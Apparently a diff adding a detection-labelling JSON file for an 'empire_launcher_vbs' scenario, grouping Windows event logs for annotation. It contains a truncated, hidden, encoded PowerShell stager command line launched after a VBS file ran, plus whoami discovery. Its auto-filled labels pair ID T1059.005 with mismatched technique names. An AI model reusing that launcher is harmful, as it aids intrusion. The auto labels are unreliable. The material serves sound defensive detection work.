@@ -1,0 +1,1887 @@
+{
+  "scenario": "empire_launcher_vbs_2020-09-04160940",
+  "total_groups": 13,
+  "instruction": "각 그룹의 sample_logs와 anchor를 확인한 뒤 gt_ 필드를 채워주세요. gt_is_true_positive: 해당 그룹이 실제 공격 행위인지 (true/false). gt_technique_id: 실제 MITRE technique ID (예: T1059.001). gt_tactic: 실제 tactic 이름 (예: Execution). gt_notes: 판단 근거나 메모.",
+  "groups": [
+    {
+      "group_id": "T1021_003_14",
+      "rule_technique_id": "T1021.003",
+      "rule_technique_name": "Distributed Component Object Model",
+      "confidence": 0.67,
+      "anchor": {
+        "idx": 14,
+        "EventID": 4624,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:09:40.850000+00:00"
+      },
+      "num_events": 13,
+      "event_id_distribution": {
+        "3": 6,
+        "7": 5,
+        "4624": 1,
+        "11": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 12,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:40.849000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 14,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-04 20:09:40.850000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 16,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:40.851000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 18,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:09:42.845000+00:00",
+          "Image": "C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 19,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:09:42.846000+00:00",
+          "Image": "C:\\Windows\\System32\\lsass.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 393,
+          "EventID": 11,
+          "TimeCreated": "2020-09-04 20:09:57.122000+00:00",
+          "Image": "C:\\windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 837,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:09:58.273000+00:00",
+          "Image": "C:\\Windows\\System32\\dns.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 838,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:09:58.274000+00:00",
+          "Image": "C:\\Windows\\System32\\dns.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1282,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:00.511000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1285,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:00.512000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1288,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:00.514000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1642,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:10:02.766000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1643,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:10:02.766000+00:00",
+          "Image": "C:\\Windows\\System32\\lsass.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Distributed Component Object Model",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.003)"
+    },
+    {
+      "group_id": "T1021_003_1996",
+      "rule_technique_id": "T1021.003",
+      "rule_technique_name": "Distributed Component Object Model",
+      "confidence": 0.67,
+      "anchor": {
+        "idx": 1996,
+        "EventID": 4624,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:10:41.065000+00:00"
+      },
+      "num_events": 5,
+      "event_id_distribution": {
+        "7": 2,
+        "3": 2,
+        "4624": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 1996,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-04 20:10:41.065000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1999,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:41.067000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2002,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:41.068000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2007,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:10:43.077000+00:00",
+          "Image": "C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2008,
+          "EventID": 3,
+          "TimeCreated": "2020-09-04 20:10:43.077000+00:00",
+          "Image": "C:\\Windows\\System32\\lsass.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Distributed Component Object Model",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.003)"
+    },
+    {
+      "group_id": "T1027_259",
+      "rule_technique_id": "T1027",
+      "rule_technique_name": "Obfuscated Files or Information",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 259,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADg",
+        "TimeCreated": "2020-09-04 20:09:57.060000+00:00"
+      },
+      "num_events": 1112,
+      "event_id_distribution": {
+        "12": 407,
+        "7": 312,
+        "10": 97,
+        "4656": 80,
+        "4663": 64,
+        "4103": 59,
+        "13": 52,
+        "11": 18,
+        "600": 6,
+        "1": 5,
+        "5": 2,
+        "3": 2,
+        "22": 2,
+        "23": 2,
+        "17": 2,
+        "400": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 56,
+          "EventID": 10,
+          "TimeCreated": "2020-09-04 20:09:55.941000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Obfuscated Files or Information",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1027_327",
+      "rule_technique_id": "T1027",
+      "rule_technique_name": "Obfuscated Files or Information",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 327,
+        "EventID": 4688,
+        "Image": "nan",
+        "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADg",
+        "TimeCreated": "2020-09-04 20:09:57.091000+00:00"
+      },
+      "num_events": 1106,
+      "event_id_distribution": {
+        "12": 407,
+        "7": 312,
+        "10": 97,
+        "4656": 80,
+        "4663": 64,
+        "4103": 59,
+        "13": 52,
+        "11": 18,
+        "600": 6,
+        "1": 5,
+        "3": 2,
+        "22": 2,
+        "4688": 1,
+        "400": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 56,
+          "EventID": 10,
+          "TimeCreated": "2020-09-04 20:09:55.941000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Obfuscated Files or Information",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1027_917",
+      "rule_technique_id": "T1027",
+      "rule_technique_name": "Obfuscated Files or Information",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 917,
+        "EventID": 4104,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:10:00.327000+00:00"
+      },
+      "num_events": 412,
+      "event_id_distribution": {
+        "7": 312,
+        "4103": 65,
+        "11": 18,
+        "600": 6,
+        "1": 5,
+        "3": 2,
+        "22": 2,
+        "400": 1,
+        "4104": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 72,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:09:55.953000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "\"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 75,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.953000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 76,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.953000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 77,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.953000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 78,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.954000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 79,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.955000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 80,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.956000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 81,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.956000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 85,
+          "EventID": 11,
+          "TimeCreated": "2020-09-04 20:09:55.958000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 91,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.961000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 90,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.961000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 92,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.962000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 93,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.962000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 94,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.963000+00:00",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Obfuscated Files or Information",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1027,c=1.00)"
+    },
+    {
+      "group_id": "T1033_1816",
+      "rule_technique_id": "T1033",
+      "rule_technique_name": "System Owner/User Discovery",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1816,
+        "EventID": 4688,
+        "Image": "nan",
+        "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+        "TimeCreated": "2020-09-04 20:10:24.931000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "4688": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 1816,
+          "EventID": 4688,
+          "TimeCreated": "2020-09-04 20:10:24.931000+00:00",
+          "Image": "nan",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "System Owner/User Discovery",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1033)"
+    },
+    {
+      "group_id": "T1033_1819",
+      "rule_technique_id": "T1033",
+      "rule_technique_name": "System Owner/User Discovery",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1819,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\whoami.exe",
+        "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+        "TimeCreated": "2020-09-04 20:10:24.933000+00:00"
+      },
+      "num_events": 36,
+      "event_id_distribution": {
+        "7": 25,
+        "12": 7,
+        "17": 1,
+        "18": 1,
+        "1": 1,
+        "5": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 1755,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:10:19.855000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 1782,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:10:22.895000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 1815,
+          "EventID": 17,
+          "TimeCreated": "2020-09-04 20:10:24.931000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1817,
+          "EventID": 18,
+          "TimeCreated": "2020-09-04 20:10:24.932000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1819,
+          "EventID": 1,
+          "TimeCreated": "2020-09-04 20:10:24.933000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1825,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.936000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1828,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.938000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1829,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.938000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1834,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.940000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1836,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.941000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1837,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:10:24.941000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
